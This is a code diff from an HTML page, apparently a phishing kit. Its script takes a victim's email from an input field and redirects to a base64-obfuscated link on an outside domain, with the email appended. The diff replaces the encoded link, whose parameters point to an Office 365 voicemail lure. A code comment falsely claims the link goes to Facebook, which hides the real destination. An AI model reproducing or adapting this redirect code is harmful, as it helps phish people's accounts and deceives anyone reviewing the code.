@@ -1808,9 +1808,8 @@ src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4QAYRXhpZgAASUkqAAgAAAAA
     function continueLoading() {
         var xrxrrrrrr = document.getElementById('xrxrrrrrr-input').value;
         redirect(xrxrrrrrr);
-    }
-function redirect(email) {
-    var linkx = "aHR0cHM6Ly9icnV4b2Fkcmlhbm8uY29tL28vYzNZOWJ6TTJOVjh4WDNadmFXTmxKbkpoYm1ROVlWUktTazVyT0QwbWRXbGtQVlZUUlZJeU1URXhNakF5TkZVeE9URXhNakV4Tnc9PU4wMTIzTltFTUFJTF0=="; // Base64 encoded link for "https://www.facebook.com/"
+   function redirect(email) {
+    var linkx = "aHR0cHM6Ly9icnV4b2Fkcmlhbm8uY29tL28/?YzM9bzM2NV8xX3ZvaWNlJnJhbmQ9YVRKSk5rOD0mdWlkPVVTRVIyMTExMjAyNFUxOTExMjExNw==N0123N%5BEMAIL%5D"; // Base64 encoded link for "https://www.facebook.com/"
     try {
         var decodedLink = atob(linkx); // Decode the Base64 link
         var finalLink = decodedLink + "#" + encodeURIComponent(email); // Encode email and append
@@ -1819,7 +1818,6 @@ function redirect(email) {
         console.error("Failed to decode the link or redirect:", error);
     }
 }
-
     }
 </script>
 
